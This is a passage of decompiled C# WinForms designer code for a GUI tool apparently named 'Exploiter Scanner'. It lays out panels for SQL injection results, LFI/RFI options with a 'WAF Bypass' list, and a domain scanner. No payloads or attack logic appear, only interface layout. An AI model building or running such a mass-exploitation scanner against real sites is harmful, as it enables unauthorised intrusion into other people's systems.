		this.lstAnalizerError.FormattingEnabled = true;
		this.lstAnalizerError.IntegralHeight = false;
		this.lstAnalizerError.Location = new Point(3, 3);
		this.lstAnalizerError.Name = "lstAnalizerError";
		this.lstAnalizerError.Size = new Size(559, 245);
		this.lstAnalizerError.TabIndex = 2;
		this.lstAnalizerError.ThreeDCheckBoxes = true;
		this.lstAnalizerError.UseTabStops = false;
		this.grbHTTPExploit.Controls.Add(this.chkSkipHttpStatus4xx);
		this.grbHTTPExploit.Controls.Add(this.chkExploitIgnoreCookies);
		this.grbHTTPExploit.Controls.Add(this.chkLfiWindowsSkip);
		this.grbHTTPExploit.Location = new Point(411, 1078);
		this.grbHTTPExploit.Name = "grbHTTPExploit";
		this.grbHTTPExploit.Size = new Size(171, 200);
		this.grbHTTPExploit.TabIndex = 5;
		this.grbHTTPExploit.TabStop = false;
		this.grbHTTPExploit.Text = "HTTP Exploit Setup";
		this.chkSkipHttpStatus4xx.Checked = true;
		this.chkSkipHttpStatus4xx.CheckState = CheckState.Checked;
		this.chkSkipHttpStatus4xx.Location = new Point(8, 91);
		this.chkSkipHttpStatus4xx.Margin = new Padding(4, 5, 4, 5);
		this.chkSkipHttpStatus4xx.Name = "chkSkipHttpStatus4xx";
		this.chkSkipHttpStatus4xx.Size = new Size(158, 49);
		this.chkSkipHttpStatus4xx.TabIndex = 1;
		this.chkSkipHttpStatus4xx.Text = "Skip HTTP Satus 4xx Client Error";
		this.chkSkipHttpStatus4xx.UseVisualStyleBackColor = true;
		this.chkExploitIgnoreCookies.Location = new Point(8, 22);
		this.chkExploitIgnoreCookies.Margin = new Padding(4, 5, 4, 5);
		this.chkExploitIgnoreCookies.Name = "chkExploitIgnoreCookies";
		this.chkExploitIgnoreCookies.Size = new Size(158, 69);
		this.chkExploitIgnoreCookies.TabIndex = 0;
		this.chkExploitIgnoreCookies.Text = "Try also as \"Ignore tracking cookies WAF\"";
		this.chkExploitIgnoreCookies.UseVisualStyleBackColor = true;
		this.chkLfiWindowsSkip.Checked = true;
		this.chkLfiWindowsSkip.CheckState = CheckState.Checked;
		this.chkLfiWindowsSkip.Location = new Point(8, 135);
		this.chkLfiWindowsSkip.Margin = new Padding(4, 5, 4, 5);
		this.chkLfiWindowsSkip.Name = "chkLfiWindowsSkip";
		this.chkLfiWindowsSkip.Size = new Size(158, 58);
		this.chkLfiWindowsSkip.TabIndex = 2;
		this.chkLfiWindowsSkip.Text = "Disable LFI on Windows Server";
		this.chkLfiWindowsSkip.UseVisualStyleBackColor = true;
		this.grbFileIncWAFs.Controls.Add(this.lvwWafs);
		this.grbFileIncWAFs.Location = new Point(3, 1078);
		this.grbFileIncWAFs.Name = "grbFileIncWAFs";
		this.grbFileIncWAFs.Size = new Size(402, 200);
		this.grbFileIncWAFs.TabIndex = 4;
		this.grbFileIncWAFs.TabStop = false;
		this.grbFileIncWAFs.Text = "WAF Bypass (LFI/RFI)";
		this.lvwWafs.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
		this.lvwWafs.Columns.AddRange(new ColumnHeader[]
		{
			this.ColumnHeader11,
			this.ColumnHeader12
		});
		this.lvwWafs.ContextMenuStrip = this.mnuPaths;
		this.lvwWafs.FullRowSelect = true;
		this.lvwWafs.HideSelection = false;
		this.lvwWafs.Location = new Point(8, 25);
		this.lvwWafs.MultiSelect = false;
		this.lvwWafs.Name = "lvwWafs";
		this.lvwWafs.Size = new Size(384, 166);
		this.lvwWafs.TabIndex = 8;
		this.lvwWafs.UseCompatibleStateImageBehavior = false;
		this.lvwWafs.View = View.Details;
		this.ColumnHeader11.Text = "Outset";
		this.ColumnHeader11.Width = 90;
		this.ColumnHeader12.Text = "Ending";
		this.ColumnHeader12.Width = 90;
		this.lblAdvanced.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, 0);
		this.lblAdvanced.ForeColor = Color.Black;
		this.lblAdvanced.Location = new Point(3, 1278);
		this.lblAdvanced.Margin = new Padding(4, 0, 4, 0);
		this.lblAdvanced.Name = "lblAdvanced";
		this.lblAdvanced.Size = new Size(579, 34);
		this.lblAdvanced.TabIndex = 3;
		this.lblAdvanced.Text = "github.com/AngelSecurityTeam";
		this.lblAdvanced.TextAlign = ContentAlignment.MiddleCenter;
		this.grbRFI.Controls.Add(this.txtRFIkeyword);
		this.grbRFI.Controls.Add(this.txtRFIurl);
		this.grbRFI.Controls.Add(this.lblRFIkeyword);
		this.grbRFI.Controls.Add(this.lblRFIurl);
		this.grbRFI.Location = new Point(3, 978);
		this.grbRFI.Name = "grbRFI";
		this.grbRFI.Size = new Size(579, 100);
		this.grbRFI.TabIndex = 2;
		this.grbRFI.TabStop = false;
		this.grbRFI.Text = "RFI (Remote File Include)";
		this.txtRFIkeyword.Anchor = (AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right);
		this.txtRFIkeyword.CharacterCasing = CharacterCasing.Lower;
		this.txtRFIkeyword.Location = new Point(126, 58);
		this.txtRFIkeyword.Name = "txtRFIkeyword";
		this.txtRFIkeyword.Size = new Size(434, 26);
		this.txtRFIkeyword.TabIndex = 1;
		this.txtRFIkeyword.Text = "{window.google=";
		this.txtRFIurl.Anchor = (AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right);
		this.txtRFIurl.CharacterCasing = CharacterCasing.Lower;
		this.txtRFIurl.Location = new Point(126, 25);
		this.txtRFIurl.Name = "txtRFIurl";
		this.txtRFIurl.Size = new Size(434, 26);
		this.txtRFIurl.TabIndex = 0;
		this.txtRFIurl.Text = "http://www.google.com";
		this.lblRFIkeyword.Location = new Point(14, 57);
		this.lblRFIkeyword.Margin = new Padding(4, 0, 4, 0);
		this.lblRFIkeyword.Name = "lblRFIkeyword";
		this.lblRFIkeyword.Size = new Size(106, 26);
		this.lblRFIkeyword.TabIndex = 40;
		this.lblRFIkeyword.Text = "Keyword";
		this.lblRFIkeyword.TextAlign = ContentAlignment.MiddleRight;
		this.lblRFIurl.Location = new Point(14, 25);
		this.lblRFIurl.Margin = new Padding(4, 0, 4, 0);
		this.lblRFIurl.Name = "lblRFIurl";
		this.lblRFIurl.Size = new Size(106, 26);
		this.lblRFIurl.TabIndex = 38;
		this.lblRFIurl.Text = "URL";
		this.lblRFIurl.TextAlign = ContentAlignment.MiddleRight;
		this.grbScanner.Controls.Add(this.tabScanner);
		this.grbScanner.Location = new Point(3, 3);
		this.grbScanner.Name = "grbScanner";
		this.grbScanner.Size = new Size(579, 228);
		this.grbScanner.TabIndex = 7;
		this.grbScanner.TabStop = false;
		this.grbScanner.Text = "Scanner Domain";
		this.tabScanner.Alignment = TabAlignment.Top;
		this.tabScanner.Controls.Add(this.TabPage4);
		this.tabScanner.Controls.Add(this.TabPage5);
		this.tabScanner.Dock = DockStyle.Fill;
		this.tabScanner.Location = new Point(3, 22);
		this.tabScanner.Margin = new Padding(4, 5, 4, 5);
		this.tabScanner.Name = "tabScanner";
		this.tabScanner.SelectedIndex = 0;
		this.tabScanner.Size = new Size(573, 203);
		this.tabScanner.TabIndex = 0;
		this.TabPage4.Controls.Add(this.lvwScannerDomain);
		this.TabPage4.Location = new Point(4, 29);
		this.TabPage4.Margin = new Padding(4, 5, 4, 5);
		this.TabPage4.Name = "TabPage4";
		this.TabPage4.Padding = new Padding(4, 5, 4, 5);
		this.TabPage4.Size = new Size(565, 170);
		this.TabPage4.TabIndex = 0;
		this.TabPage4.Text = "Domain";
		this.TabPage4.UseVisualStyleBackColor = true;
		this.lvwScannerDomain.Columns.AddRange(new ColumnHeader[]
		{
			this.ColumnHeader32,
			this.ColumnHeader33
		});
		this.lvwScannerDomain.ContextMenuStrip = this.mnuScannerDomain;
		this.lvwScannerDomain.Dock = DockStyle.Fill;
		this.lvwScannerDomain.FullRowSelect = true;
		this.lvwScannerDomain.GridLines = true;
		this.lvwScannerDomain.HideSelection = false;
		this.lvwScannerDomain.Location = new Point(4, 5);
		this.lvwScannerDomain.MultiSelect = false;
		this.lvwScannerDomain.Name = "lvwScannerDomain";
		this.lvwScannerDomain.Size = new Size(557, 160);
		this.lvwScannerDomain.TabIndex = 0;
		this.lvwScannerDomain.UseCompatibleStateImageBehavior = false;
		this.lvwScannerDomain.View = View.Details;
		this.ColumnHeader32.Text = "Host";
		this.ColumnHeader32.Width = 152;
		this.ColumnHeader33.Text = "Domain";
		this.ColumnHeader33.Width = 95;
		this.mnuScannerDomain.ImageScalingSize = new Size(24, 24);
		this.mnuScannerDomain.Items.AddRange(new ToolStripItem[]
		{
			this.ScannerDomainEdit
		});
		this.mnuScannerDomain.Name = "mnuChecked";
		this.mnuScannerDomain.ShowImageMargin = false;
		this.mnuScannerDomain.ShowItemToolTips = false;
		this.mnuScannerDomain.Size = new Size(90, 34);
		this.ScannerDomainEdit.Name = "ScannerDomainEdit";
		this.ScannerDomainEdit.Size = new Size(89, 30);
		this.ScannerDomainEdit.Text = "Edit";
		this.TabPage5.Controls.Add(this.btnExcludeUrlWords);
		this.TabPage5.Controls.Add(this.lstExcludeUrlWords);
		this.TabPage5.Controls.Add(this.txtExcludeUrlWords);
		this.TabPage5.Controls.Add(this.lblSkipWordURL);
		this.TabPage5.Location = new Point(4, 29);
		this.TabPage5.Margin = new Padding(4, 5, 4, 5);
		this.TabPage5.Name = "TabPage5";
		this.TabPage5.Padding = new Padding(4, 5, 4, 5);
		this.TabPage5.Size = new Size(565, 170);
		this.TabPage5.TabIndex = 1;
		this.TabPage5.Text = "URL BlackList";
		this.TabPage5.UseVisualStyleBackColor = true;
		this.ntfTray.BalloonTipIcon = ToolTipIcon.Info;
		this.ntfTray.BalloonTipTitle = "Exploiter Scanner Info";
		this.ntfTray.Text = "Exploiter Scanner";
		this.numThreads.BackColor = SystemColors.Window;
		this.numThreads.Location = new Point(2146, 698);
		this.numThreads.Margin = new Padding(4, 5, 4, 5);
		NumericUpDown numThreads = this.numThreads;
		int[] array24 = new int[4];
		array24[0] = 10;
		numThreads.Maximum = new decimal(array24);
		NumericUpDown numThreads2 = this.numThreads;
		int[] array25 = new int[4];
		array25[0] = 1;
		numThreads2.Minimum = new decimal(array25);
		this.numThreads.Name = "numThreads";
		this.numThreads.Size = new Size(94, 26);
		this.numThreads.TabIndex = 28;
		NumericUpDown numThreads3 = this.numThreads;
		int[] array26 = new int[4];
		array26[0] = 1;
		numThreads3.Value = new decimal(array26);
		this.tsWorker.Dock = DockStyle.Bottom;
		this.tsWorker.GripStyle = ToolStripGripStyle.Hidden;
		this.tsWorker.ImageScalingSize = new Size(24, 24);
		this.tsWorker.Items.AddRange(new ToolStripItem[]
		{
			this.btnStart,
			this.btnPause,
			this.btnPauseSP,
			this.btnStop,
			this.prbMainStatus
		});
		this.tsWorker.Location = new Point(0, 979);
		this.tsWorker.Name = "tsWorker";
		this.tsWorker.Padding = new Padding(0, 0, 2, 0);
		this.tsWorker.RenderMode = ToolStripRenderMode.System;
		this.tsWorker.ShowItemToolTips = false;
		this.tsWorker.Size = new Size(2583, 32);
		this.tsWorker.TabIndex = 36;
		this.btnStart.Image = Class6.Run_16x_24;
		this.btnStart.ImageTransparentColor = Color.Magenta;
		this.btnStart.Name = "btnStart";
		this.btnStart.Size = new Size(76, 29);
		this.btnStart.Text = "&Start";
		this.btnStart.ToolTipText = "Start Worker";
		this.btnPause.CheckOnClick = true;
		this.btnPause.Image = Class6.Pause_16x_24;
		this.btnPause.ImageTransparentColor = Color.Magenta;
		this.btnPause.Name = "btnPause";
		this.btnPause.Size = new Size(85, 29);
		this.btnPause.Text = "&Pause";
		this.btnPause.ToolTipText = "Pause Worker";
		this.btnPauseSP.Name = "btnPauseSP";
		this.btnPauseSP.Size = new Size(6, 32);
		this.btnStop.Image = Class6.Stop_16x_24;
		this.btnStop.ImageTransparentColor = Color.Magenta;
		this.btnStop.Name = "btnStop";
		this.btnStop.Size = new Size(77, 29);
		this.btnStop.Text = "&Stop";
		this.btnStop.ToolTipText = "Stop Worker";
		this.prbMainStatus.Alignment = ToolStripItemAlignment.Right;
		this.prbMainStatus.AutoSize = false;
		this.prbMainStatus.Name = "prbMainStatus";
		this.prbMainStatus.Size = new Size(200, 22);
		this.prbMainStatus.Visible = false;
		this.pnlSQLi.AutoScroll = true;
		this.pnlSQLi.Controls.Add(this.dtgSQLi);
		this.pnlSQLi.Controls.Add(this.tsSearchColumn);
		this.pnlSQLi.Controls.Add(this.tsSQLi);
		this.pnlSQLi.Location = new Point(267, 787);
		this.pnlSQLi.Margin = new Padding(4, 5, 4, 5);
		this.pnlSQLi.Name = "pnlSQLi";
		this.pnlSQLi.Size = new Size(1148, 135);
		this.pnlSQLi.TabIndex = 37;
		this.pnlSQLi.Visible = false;
		this.dtgSQLi.AllowUserToAddRows = false;
		this.dtgSQLi.AllowUserToDeleteRows = false;
		this.dtgSQLi.AllowUserToOrderColumns = true;
		this.dtgSQLi.AllowUserToResizeRows = false;
		this.dtgSQLi.BackgroundColor = SystemColors.Window;
		this.dtgSQLi.BorderStyle = BorderStyle.Fixed3D;
		this.dtgSQLi.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgSQLi.Columns.AddRange(new DataGridViewColumn[]
		{
			this.Column6,
			this.Column7,
			this.Column8,
			this.Column9,
			this.Column10,
			this.Column11,
			this.Column12,
			this.Column13,
			this.Column16
		});
		this.dtgSQLi.Dock = DockStyle.Fill;
		this.dtgSQLi.EditMode = DataGridViewEditMode.EditOnF2;
		this.dtgSQLi.Location = new Point(0, 33);
		this.dtgSQLi.Name = "dtgSQLi";
		this.dtgSQLi.RowHeadersVisible = false;
		this.dtgSQLi.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		this.dtgSQLi.ShowCellErrors = false;
		this.dtgSQLi.ShowEditingIcon = false;
		this.dtgSQLi.ShowRowErrors = false;
		this.dtgSQLi.Size = new Size(1148, 69);
		this.dtgSQLi.TabIndex = 38;
		this.Column6.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.Column6.HeaderText = "";
		this.Column6.Name = "Column6";
		this.Column6.Resizable = DataGridViewTriState.False;
		this.Column6.Width = 5;
		this.Column7.HeaderText = "URL";
		this.Column7.Name = "Column7";
		this.Column7.Resizable = DataGridViewTriState.True;
		this.Column7.Width = 420;
		this.Column8.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.Column8.HeaderText = "Type";
		this.Column8.Name = "Column8";
		this.Column8.ReadOnly = true;
		this.Column8.Resizable = DataGridViewTriState.False;
		this.Column8.Width = 79;
		this.Column9.HeaderText = "SQL Version";
		this.Column9.Name = "Column9";
		this.Column9.Width = 135;
		this.Column10.HeaderText = "Highlight";
		this.Column10.Name = "Column10";
		this.Column10.Width = 150;
		this.Column11.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.Column11.HeaderText = "Country";
		this.Column11.Name = "Column11";
		this.Column11.ReadOnly = true;
		this.Column11.Resizable = DataGridViewTriState.False;
		this.Column12.HeaderText = "Search Column";
		this.Column12.Name = "Column12";
		this.Column12.Resizable = DataGridViewTriState.True;
		this.Column12.Width = 200;
		this.Column13.HeaderText = "Last Check";
		this.Column13.Name = "Column13";
		this.Column13.Resizable = DataGridViewTriState.False;
		this.Column13.Width = 155;
		this.Column16.HeaderText = "Comments";
		this.Column16.Name = "Column16";
		this.tsSearchColumn.Dock = DockStyle.Bottom;
		this.tsSearchColumn.GripStyle = ToolStripGripStyle.Hidden;
		this.tsSearchColumn.ImageScalingSize = new Size(24, 24);
		this.tsSearchColumn.Items.AddRange(new ToolStripItem[]
		{
			this.btnSearchColumnStart,
			this.cmbSearchColumnType,
			this.ToolStripSeparator3,
			this.chkSearchColumn,
			this.cmbSearchColumn,
			this.chkSearchColumn2,
			this.cmbSearchColumn2,
			this.chkSearchColumn3,
			this.cmbSearchColumn3,
			this.chkSearchColumn4,
			this.cmbSearchColumn4,
			this.ToolStripSeparator21,
			this.chkSearchColumnAllDBs,
			this.ToolStripSeparator18,
			this.lblSearchColumnThreads,
			this.btnSearchColumnPause,
			this.btnSearchColumnSP,
			this.btnSearchColumnStop,
			this.prbSearchColumn
		});
		this.tsSearchColumn.Location = new Point(0, 102);
		this.tsSearchColumn.Name = "tsSearchColumn";
		this.tsSearchColumn.Padding = new Padding(0, 0, 2, 0);
		this.tsSearchColumn.RenderMode = ToolStripRenderMode.System;
		this.tsSearchColumn.ShowItemToolTips = false;
		this.tsSearchColumn.Size = new Size(1148, 33);
		this.tsSearchColumn.TabIndex = 37;
		this.btnSearchColumnStart.Alignment = ToolStripItemAlignment.Right;
		this.btnSearchColumnStart.Enabled = false;
		this.btnSearchColumnStart.Image = Class6.Run_16x_24;
		this.btnSearchColumnStart.ImageTransparentColor = Color.Magenta;
		this.btnSearchColumnStart.Name = "btnSearchColumnStart";
		this.btnSearchColumnStart.Size = new Size(133, 30);
		this.btnSearchColumnStart.Text = "&Start Search";
		this.btnSearchColumnStart.ToolTipText = "Start Checker";
		this.cmbSearchColumnType.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbSearchColumnType.FlatStyle = FlatStyle.System;
		this.cmbSearchColumnType.Name = "cmbSearchColumnType";
		this.cmbSearchColumnType.Size = new Size(126, 33);
		this.cmbSearchColumnType.Visible = false;
		this.ToolStripSeparator3.Name = "ToolStripSeparator3";
		this.ToolStripSeparator3.Size = new Size(6, 33);
		this.ToolStripSeparator3.Visible = false;
		this.chkSearchColumn.Checked = true;
		this.chkSearchColumn.CheckOnClick = true;
		this.chkSearchColumn.CheckState = CheckState.Checked;
		this.chkSearchColumn.DisplayStyle = ToolStripItemDisplayStyle.Text;
		this.chkSearchColumn.Image = (Image)componentResourceManager.GetObject("chkSearchColumn.Image");
		this.chkSearchColumn.ImageTransparentColor = Color.Magenta;
		this.chkSearchColumn.Name = "chkSearchColumn";
		this.chkSearchColumn.Size = new Size(28, 30);
		this.chkSearchColumn.Text = "+";
		this.cmbSearchColumn.Name = "cmbSearchColumn";
		this.cmbSearchColumn.Size = new Size(120, 33);
		this.chkSearchColumn2.CheckOnClick = true;
		this.chkSearchColumn2.DisplayStyle = ToolStripItemDisplayStyle.Text;
		this.chkSearchColumn2.Image = (Image)componentResourceManager.GetObject("chkSearchColumn2.Image");
		this.chkSearchColumn2.ImageTransparentColor = Color.Magenta;
		this.chkSearchColumn2.Name = "chkSearchColumn2";
		this.chkSearchColumn2.Size = new Size(28, 30);
		this.chkSearchColumn2.Text = "+";
		this.cmbSearchColumn2.Name = "cmbSearchColumn2";
		this.cmbSearchColumn2.Size = new Size(75, 33);
		this.chkSearchColumn3.CheckOnClick = true;
		this.chkSearchColumn3.DisplayStyle = ToolStripItemDisplayStyle.Text;
		this.chkSearchColumn3.Image = (Image)componentResourceManager.GetObject("chkSearchColumn3.Image");
		this.chkSearchColumn3.ImageTransparentColor = Color.Magenta;
		this.chkSearchColumn3.Name = "chkSearchColumn3";
		this.chkSearchColumn3.Size = new Size(28, 30);
		this.chkSearchColumn3.Text = "+";
		this.cmbSearchColumn3.Name = "cmbSearchColumn3";
		this.cmbSearchColumn3.Size = new Size(91, 33);
		this.chkSearchColumn4.CheckOnClick = true;
		this.chkSearchColumn4.DisplayStyle = ToolStripItemDisplayStyle.Text;
		this.chkSearchColumn4.Image = (Image)componentResourceManager.GetObject("chkSearchColumn4.Image");
		this.chkSearchColumn4.ImageTransparentColor = Color.Magenta;
		this.chkSearchColumn4.Name = "chkSearchColumn4";
		this.chkSearchColumn4.Size = new Size(28, 30);
		this.chkSearchColumn4.Text = "+";
		this.cmbSearchColumn4.Name = "cmbSearchColumn4";
		this.cmbSearchColumn4.Size = new Size(120, 33);
		this.ToolStripSeparator21.Name = "ToolStripSeparator21";
		this.ToolStripSeparator21.Size = new Size(6, 33);
		this.chkSearchColumnAllDBs.CheckOnClick = true;
		this.chkSearchColumnAllDBs.Image = Class6.DatabaseSchema_16x_24;
		this.chkSearchColumnAllDBs.ImageTransparentColor = Color.Magenta;
		this.chkSearchColumnAllDBs.Name = "chkSearchColumnAllDBs";
		this.chkSearchColumnAllDBs.Size = new Size(146, 30);
		this.chkSearchColumnAllDBs.Text = "All DataBases";
		this.ToolStripSeparator18.Name = "ToolStripSeparator18";
		this.ToolStripSeparator18.Size = new Size(6, 33);
		this.lblSearchColumnThreads.Name = "lblSearchColumnThreads";
		this.lblSearchColumnThreads.Size = new Size(74, 30);
		this.lblSearchColumnThreads.Text = "Threads";
		this.btnSearchColumnPause.Alignment = ToolStripItemAlignment.Right;
		this.btnSearchColumnPause.CheckOnClick = true;
		this.btnSearchColumnPause.Image = Class6.Pause_16x_24;
		this.btnSearchColumnPause.ImageTransparentColor = Color.Magenta;
		this.btnSearchColumnPause.Name = "btnSearchColumnPause";
		this.btnSearchColumnPause.Size = new Size(85, 30);
		this.btnSearchColumnPause.Text = "&Pause";
		this.btnSearchColumnPause.ToolTipText = "Pause Worker";
		this.btnSearchColumnPause.Visible = false;
		this.btnSearchColumnSP.Alignment = ToolStripItemAlignment.Right;
		this.btnSearchColumnSP.Name = "btnSearchColumnSP";
		this.btnSearchColumnSP.Size = new Size(6, 33);
		this.btnSearchColumnSP.Visible = false;
		this.btnSearchColumnStop.Alignment = ToolStripItemAlignment.Right;
		this.btnSearchColumnStop.Image = Class6.Stop_16x_24;
		this.btnSearchColumnStop.ImageTransparentColor = Color.Magenta;
		this.btnSearchColumnStop.Name = "btnSearchColumnStop";
		this.btnSearchColumnStop.Size = new Size(77, 30);
		this.btnSearchColumnStop.Text = "&Stop";
		this.btnSearchColumnStop.ToolTipText = "Stop Worker";
		this.btnSearchColumnStop.Visible = false;
		this.prbSearchColumn.Alignment = ToolStripItemAlignment.Right;
		this.prbSearchColumn.AutoSize = false;
		this.prbSearchColumn.Name = "prbSearchColumn";
		this.prbSearchColumn.Size = new Size(133, 14);
		this.prbSearchColumn.Visible = false;
		this.tsSQLi.GripStyle = ToolStripGripStyle.Hidden;
		this.tsSQLi.ImageScalingSize = new Size(24, 24);
		this.tsSQLi.Items.AddRange(new ToolStripItem[]
		{
			this.cmbSQLiFilter,
			this.cmbSQLiSearch,
			this.btnSQLiSearchClear,
			this.txtSQLiSearch,
			this.btnSQLiSearch,
			this.ToolStripSeparator12,
			this.lblSQLi
		});
		this.tsSQLi.Location = new Point(0, 0);
		this.tsSQLi.Name = "tsSQLi";
		this.tsSQLi.Padding = new Padding(0, 0, 2, 0);
		this.tsSQLi.RenderMode = ToolStripRenderMode.System;
		this.tsSQLi.ShowItemToolTips = false;
		this.tsSQLi.Size = new Size(1148, 33);
		this.tsSQLi.TabIndex = 3;
		this.tsSQLi.Text = "ToolStrip2";
		this.cmbSQLiFilter.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbSQLiFilter.Name = "cmbSQLiFilter";
		this.cmbSQLiFilter.Size = new Size(110, 33);
		this.cmbSQLiSearch.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbSQLiSearch.Name = "cmbSQLiSearch";
		this.cmbSQLiSearch.Size = new Size(160, 33);
		this.btnSQLiSearchClear.DisplayStyle = ToolStripItemDisplayStyle.Image;
		this.btnSQLiSearchClear.Image = Class6.delete;
		this.btnSQLiSearchClear.ImageTransparentColor = Color.Magenta;
		this.btnSQLiSearchClear.Name = "btnSQLiSearchClear";
		this.btnSQLiSearchClear.Size = new Size(28, 30);
		this.btnSQLiSearchClear.Text = "Clear";
		this.txtSQLiSearch.Name = "txtSQLiSearch";
		this.txtSQLiSearch.Size = new Size(148, 33);
		this.btnSQLiSearch.Image = Class6.SearchContract_16x_24;
		this.btnSQLiSearch.ImageTransparentColor = Color.Magenta;
		this.btnSQLiSearch.Name = "btnSQLiSearch";
		this.btnSQLiSearch.Size = new Size(92, 30);
		this.btnSQLiSearch.Text = "Search";
		this.ToolStripSeparator12.Alignment = ToolStripItemAlignment.Right;
		this.ToolStripSeparator12.Name = "ToolStripSeparator12";
		this.ToolStripSeparator12.Size = new Size(6, 33);
		this.lblSQLi.Alignment = ToolStripItemAlignment.Right;
		this.lblSQLi.Name = "lblSQLi";
		this.lblSQLi.Size = new Size(67, 30);
		this.lblSQLi.Text = "lblSQLi";
		this.mnuSearchColumn.ImageScalingSize = new Size(24, 24);
		this.mnuSearchColumn.Items.AddRange(new ToolStripItem[]
		{
			this.mnuSearchColumnRem,
			this.mnuSearchColumnClear
		});
		this.mnuSearchColumn.Name = "mnuChecked";
		this.mnuSearchColumn.ShowImageMargin = false;
		this.mnuSearchColumn.ShowItemToolTips = false;
		this.mnuSearchColumn.Size = new Size(124, 64);
		this.mnuSearchColumnRem.Name = "mnuSearchColumnRem";
		this.mnuSearchColumnRem.Size = new Size(123, 30);
		this.mnuSearchColumnRem.Text = "Remove";
		this.mnuSearchColumnClear.Name = "mnuSearchColumnClear";
		this.mnuSearchColumnClear.Size = new Size(123, 30);
		this.mnuSearchColumnClear.Text = "Clear";
		this.pnlSQLiNoInjectable.AutoScroll = true;
		this.pnlSQLiNoInjectable.Controls.Add(this.dtgSQLiNoInjectable);
		this.pnlSQLiNoInjectable.Controls.Add(this.tsSQLiNoInjectable);
		this.pnlSQLiNoInjectable.Location = new Point(267, 659);
		this.pnlSQLiNoInjectable.Margin = new Padding(4, 5, 4, 5);
		this.pnlSQLiNoInjectable.Name = "pnlSQLiNoInjectable";
		this.pnlSQLiNoInjectable.Size = new Size(612, 118);
		this.pnlSQLiNoInjectable.TabIndex = 38;
		this.pnlSQLiNoInjectable.Visible = false;
		this.dtgSQLiNoInjectable.AllowUserToAddRows = false;
		this.dtgSQLiNoInjectable.AllowUserToDeleteRows = false;
		this.dtgSQLiNoInjectable.AllowUserToOrderColumns = true;
		this.dtgSQLiNoInjectable.AllowUserToResizeRows = false;
		this.dtgSQLiNoInjectable.BackgroundColor = SystemColors.Window;
		this.dtgSQLiNoInjectable.BorderStyle = BorderStyle.Fixed3D;
		this.dtgSQLiNoInjectable.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgSQLiNoInjectable.Columns.AddRange(new DataGridViewColumn[]
		{
			this.DataGridViewImageColumn2,
			this.DataGridViewTextBoxColumn4,
			this.DataGridViewTextBoxColumn5,
			this.DataGridViewTextBoxColumn7,
			this.DataGridViewTextBoxColumn9,
			this.Column17
		});
		this.dtgSQLiNoInjectable.Dock = DockStyle.Fill;
		this.dtgSQLiNoInjectable.EditMode = DataGridViewEditMode.EditOnF2;
		this.dtgSQLiNoInjectable.Location = new Point(0, 33);
		this.dtgSQLiNoInjectable.Name = "dtgSQLiNoInjectable";
		this.dtgSQLiNoInjectable.RowHeadersVisible = false;
		this.dtgSQLiNoInjectable.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		this.dtgSQLiNoInjectable.ShowCellErrors = false;
		this.dtgSQLiNoInjectable.ShowEditingIcon = false;
		this.dtgSQLiNoInjectable.ShowRowErrors = false;
		this.dtgSQLiNoInjectable.Size = new Size(612, 85);
		this.dtgSQLiNoInjectable.TabIndex = 40;
		this.DataGridViewImageColumn2.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewImageColumn2.HeaderText = "";
		this.DataGridViewImageColumn2.Name = "DataGridViewImageColumn2";
		this.DataGridViewImageColumn2.Resizable = DataGridViewTriState.False;
		this.DataGridViewImageColumn2.Width = 5;
		this.DataGridViewTextBoxColumn4.HeaderText = "URL";
		this.DataGridViewTextBoxColumn4.Name = "DataGridViewTextBoxColumn4";
		this.DataGridViewTextBoxColumn4.Resizable = DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn4.Width = 400;
		this.DataGridViewTextBoxColumn5.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn5.HeaderText = "Type";
		this.DataGridViewTextBoxColumn5.Name = "DataGridViewTextBoxColumn5";
		this.DataGridViewTextBoxColumn5.ReadOnly = true;
		this.DataGridViewTextBoxColumn5.Resizable = DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn5.Width = 79;
		this.DataGridViewTextBoxColumn7.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn7.HeaderText = "Country";
		this.DataGridViewTextBoxColumn7.Name = "DataGridViewTextBoxColumn7";
		this.DataGridViewTextBoxColumn7.ReadOnly = true;
		this.DataGridViewTextBoxColumn7.Resizable = DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn9.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn9.FillWeight = 120f;
		this.DataGridViewTextBoxColumn9.HeaderText = "Checked";
		this.DataGridViewTextBoxColumn9.Name = "DataGridViewTextBoxColumn9";
		this.DataGridViewTextBoxColumn9.ReadOnly = true;
		this.DataGridViewTextBoxColumn9.Resizable = DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn9.Width = 108;
		this.Column17.HeaderText = "Comments";
		this.Column17.Name = "Column17";
		this.tsSQLiNoInjectable.GripStyle = ToolStripGripStyle.Hidden;
		this.tsSQLiNoInjectable.ImageScalingSize = new Size(24, 24);
		this.tsSQLiNoInjectable.Items.AddRange(new ToolStripItem[]
		{
			this.cmbSQLiNoInjectableFilter,
			this.cmbSQLiNoInjectableSearch,
			this.btnSQLiNoInjectableSearchClear,
			this.txtSQLiNoInjectableSearch,
			this.btnSQLiNoInjectableSearch,
			this.ToolStripSeparator13,
			this.lblSQLiNoInjectable
		});
		this.tsSQLiNoInjectable.Location = new Point(0, 0);
		this.tsSQLiNoInjectable.Name = "tsSQLiNoInjectable";
		this.tsSQLiNoInjectable.Padding = new Padding(0, 0, 2, 0);
